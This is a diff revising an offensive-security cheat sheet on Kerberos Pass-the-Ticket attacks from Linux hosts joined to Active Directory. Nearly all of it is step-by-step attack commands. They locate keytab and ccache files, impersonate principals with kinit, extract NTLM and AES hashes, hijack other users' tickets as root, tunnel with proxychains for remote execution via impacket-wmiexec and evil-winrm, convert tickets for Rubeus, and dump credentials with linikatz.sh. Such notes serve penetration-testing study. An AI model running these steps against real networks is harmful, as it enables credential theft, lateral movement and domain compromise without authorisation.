@@ -1,152 +1,170 @@
-# Linux Pass the Ticket (PtT) from Linux
+## Methodology
 
-Linux systems integrated with Active Directory (AD) use **Kerberos** for centralized identity management. If a Linux machine is compromised, attackers can locate and abuse Kerberos tickets to impersonate users and escalate privileges across the network.
+1. Confirm AD integration by checking for domain enrollment or active identity services.,
+2. Search for Kerberos artifacts:
+    - Keytab files in common directories or referenced in automation scripts.,,
+    - Active credential caches in `/tmp` or referenced in environment variables.,
+3. Evaluate access level:
+    - Unprivileged: Target owned keytabs or active session caches.,
+    - Root: Access any user ccache or the system keytab at `/etc/krb5.keytab`.,,
+4. Execute abuse:
+    - Keytab: Use for direct principal impersonation or extract hashes for cracking and Pass-the-Hash.,,
+    - Ccache: Inject into the current session to access remote resources.
+5. Pivot or convert:
+    - Use proxying to leverage tickets from an attack host via Impacket or Evil-WinRM.,
+    - Convert between Linux (ccache) and Windows (kirbi) formats for cross-platform abuse.
 
-## 1. Identification: Domain Integration
+---
 
-Before attempting PtT, confirm the Linux host is integrated with AD.
+## AD Integration Discovery
 
-### Domain Join Verification
+When seeing unexpected users or if the machine is suspected to be domain-joined, check the realm configuration.,
 
-Use these methods to identify if the machine is a domain member and which users are permitted access.
+Check domain membership and permitted login groups:
 
-|Tool|Command|Purpose|
-|:--|:--|:--|
-|**realm**|`realm list`|Lists domain configuration, permitted groups, and required packages.|
-|**ps**|`ps -ef \|grep -e "sssd" -e "winbind"`|
+```
+realm list
+```
 
-## 2. Locating Kerberos Assets
+Identify running identity services like sssd or winbind if realm is unavailable:
 
-Kerberos credentials on Linux are typically stored in two formats: **ccache files** (memory-backed/temporary) and **keytab files** (persistent/file-backed).
+```
+ps -ef | grep -i "winbind|sssd"
+```
 
-### Finding Keytab Files
+**Gotchas** **Missing realm tool** requires manual process inspection to confirm domain status.
 
-**Keytabs** contain principal names and encrypted keys (derived from passwords), allowing scripts to authenticate without human interaction.
+## Keytab Discovery
 
-1. **Search the filesystem:** Administrators often use the `.keytab` extension, though it is not mandatory.
-    
-    ```
-    find / -name "*keytab*" -ls 2>/dev/null
-    ```
-    
-2. **Check Cronjobs:** Scripts using Kerberos may reference keytabs with arbitrary extensions.
-    
-    ```
-    crontab -l
-    cat /home/<USERNAME>/.scripts/<SCRIPT_NAME>.sh
-    ```
-    
-    - **Note:** Look for the `kinit` command within scripts, as it indicates Kerberos authentication is being used to request a TGT.
+When searching for persistent credentials or service accounts, scan the filesystem for keytab files and scheduled tasks.,
 
-### Finding Credential Cache (ccache) Files
+Locate files with keytab in the name:
 
-**ccache files** hold valid Kerberos credentials for the duration of a user session.
+```
+find / -name *keytab* -ls 2>/dev/null
+```
 
-1. **Check Environment Variables:** The `KRB5CCNAME` variable identifies the current session's ticket location.
-    
-    ```
-    env | grep -i krb5
-    ```
-    
-2. **Standard Directory:** These files are most commonly stored in `/tmp`.
-    
-    ```
-    ls -la /tmp/krb5cc_*
-    ```
-    
-    - **Access Requirement:** You must have **root** or elevated privileges to read ccache files belonging to other users.
+Inspect cronjobs for scripts utilizing kinit with keytab files:
 
-## 3. Abusing Keytab Files
+```
+crontab -l
+```
 
-Keytabs allow for user impersonation or credential extraction.
+View the content of a discovery script to find specific keytab paths:
 
-### Technique A: User Impersonation (`kinit`)
+```
+cat <FILE_PATH>
+```
 
-Use this when you have a keytab and want to interact with network resources (e.g., SMB shares) as that user.
+**Gotchas** **Lack of read/write privileges** on the keytab file prevents its use or extraction.
 
-1. **Identify the Principal:** Determine which user the keytab belongs to.
-    
-    ```
-    klist -k -t /<PATH_TO_FILE>/<FILENAME>.keytab
-    ```
-    
-2. **Import the Ticket:** Use `kinit` to request a TGT using the keytab.
-    
-    ```
-    # kinit is case-sensitive: <USERNAME> is often lowercase, <DOMAIN> is uppercase
-    kinit <USERNAME>@<DOMAIN> -k -t /<PATH_TO_FILE>/<FILENAME>.keytab
-    ```
-    
-3. **Verify:** Check the active ticket in your session.
-    
-    ```
-    klist
-    ```
-    
+## Keytab Impersonation
 
-### Technique B: Credential Extraction
+When a keytab is found and the principal is known, use it to obtain a TGT without a password.,
 
-Use this when you need the user's **NTLM** or **AES** hash for local login, cracking, or Pass-the-Hash.
+Identify the principal associated with a keytab:
 
-|Action|Command|
-|:--|:--|
-|**Extract Hashes**|`python3 /opt/keytabextract.py /<PATH_TO_FILE>/<FILENAME>.keytab`|
-|**Credential Types**|Extracts NTLM, AES-256, and AES-128 hashes from 502-type keytabs.|
+```
+klist -k -t <FILE_PATH>
+```
 
-## 4. Abusing ccache Files
+Request a TGT for the principal using the keytab:
 
-If you obtain **root** access, you can hijack any active user session by utilizing their ccache file.
+```
+kinit <USERNAME>@<DOMAIN> -k -t <FILE_PATH>
+```
 
-### Workflow: ccache Hijacking
+**Gotchas** **Principal names are case-sensitive** and must match the klist output exactly.
 
-1. **Identify Target:** Locate a valid ccache file in `/tmp` for a high-privileged user (e.g., a **Domain Admin**).
-2. **Set Environment:** Copy the target ticket and point the `KRB5CCNAME` variable to it.
-    
-    ```
-    cp /tmp/krb5cc_<TARGET_ID> /root/ticket.ccache
-    export KRB5CCNAME=/root/ticket.ccache
-    ```
-    
-3. **Execution:** Access network resources as the hijacked user.
-    
-    ```
-    smbclient //<TARGET_HOSTNAME>/C$ -k -no-pass -c ls
-    ```
-    
+## Keytab Hash Extraction
 
-## 5. Remote Attack Tools & Pivoting
+When direct impersonation is insufficient or a plaintext password is required for local authentication, extract the underlying hashes.
 
-When attacking from an external machine (e.g., `<ATTACK_IP>`), you must proxy traffic and configure local Kerberos settings to use captured tickets.
+Extract NTLM and AES hashes from a keytab file:
 
-### Operational Workflow: Remote PtT
+```
+python3 <FILE_PATH_TO_KEYTABEXTRACT> <FILE_PATH>
+```
 
-1. **Resolution:** Map the domain and target hostnames in `/etc/hosts`.
-2. **Tunneling:** Use a tool like **Chisel** to create a SOCKS proxy to the internal network.
-3. **Configure Authentication:**
-    - **Impacket:** Set `KRB5CCNAME` to the captured ccache and use the `-k` and `-no-pass` flags.
-        
-        ```
-        proxychains impacket-wmiexec <TARGET_HOSTNAME> -k
-        ```
-        
-    - **Evil-WinRM:** Install `krb5-user`, configure `/etc/krb5.conf` with the domain and KDC, and use Kerberos flags.
-        
-        ```
-        proxychains evil-winrm -i <TARGET_HOSTNAME> -r <DOMAIN>
-        ```
-        
+**Gotchas** **Outdated keytabs** containing hashes for old passwords will result in authentication failure.
 
-## 6. Command Reference
+## Ccache Abuse
 
-|Command|Goal|Why it Matters|
-|:--|:--|:--|
-|`impacket-ticketConverter <INPUT> <OUTPUT>`|Convert tickets between `.ccache` (Linux) and `.kirbi` (Windows).|Essential for moving captured Linux tickets to Windows tools like Rubeus.|
-|`linikatz.sh`|Automated credential dumping on Linux.|Mimikatz-like functionality; extracts tickets from SSSD, Samba, and Kerberos implementations.|
-|`Rubeus.exe ptt /ticket:<FILE>.kirbi`|Import converted ticket on Windows.|Unlocks access to domain resources from a Windows pivot host.|
+When root access is achieved or a user session is active, hijack the Kerberos credential cache.,
 
-### Dangerous Configurations
+Identify the current user's cache location:
 
-|Setting|Implication|
-|:--|:--|
-|**Root Access**|Allows reading any user's ccache file in `/tmp` or the default machine keytab at `/etc/krb5.keytab`.|
-|**World-Readable Keytabs**|Enables any local user to impersonate the principal or extract hashes via `keytabextract.py`.|
+```
+env | grep -i krb5
+```
+
+List all available caches in the default storage directory:
+
+```
+ls -la /tmp
+```
+
+Inject a hijacked ccache into the current session:
+
+```
+export KRB5CCNAME=<FILE_PATH>
+```
+
+**Gotchas** **Expired tickets** inside a ccache file will not work; check the expiration date with klist. **Ccache files are temporary** and may disappear or change during user logout.
+
+## Remote Kerberos Abuse
+
+When attacking from a non-domain machine or pivoting through a compromised host, use Kerberos-aware tools over a proxy.
+
+Configure name resolution for the target domain:
+
+```
+cat /etc/hosts
+```
+
+Authenticate to a remote system using a hijacked ticket via Impacket:
+
+```
+proxychains impacket-wmiexec <TARGET_NAME> -k -no-pass
+```
+
+Connect via Evil-WinRM using Kerberos:
+
+```
+proxychains evil-winrm -i <TARGET_NAME> -r <DOMAIN>
+```
+
+**Tool comparison**
+
+- Impacket → `impacket-wmiexec <TARGET_NAME> -k` → Prefer for general WMI/SMB execution.
+- Evil-WinRM → `evil-winrm -i <TARGET_NAME> -r <DOMAIN>` → Prefer when WinRM is available and krb5-user is configured.
+
+> ⚠️ Gap: Impacket requires the **target machine name** instead of an IP address to correctly request and use Kerberos service tickets.
+
+**Dangerous / misconfigured settings**
+
+- Missing `FILE:` prefix in `KRB5CCNAME` on certain Linux AD implementations may cause Impacket to fail.
+
+## Ticket Conversion
+
+When moving tickets between Linux and Windows environments for Pass-the-Ticket attacks.
+
+Convert a Linux ccache to a Windows-compatible kirbi file:
+
+```
+impacket-ticketConverter <FILE_PATH> <OUTPUT_NAME>.kirbi
+```
+
+**Gotchas** **Conversion does not renew** the ticket; if it is expired in ccache, it remains expired in kirbi.,
+
+## Automated Extraction
+
+When root access is obtained and a quick sweep of all identity-related secrets is needed.
+
+Execute automated credential and ticket extraction:
+
+```
+./linikatz.sh
+```
+
+**Gotchas** **Root privileges are required** to access the various Kerberos implementation databases and files.
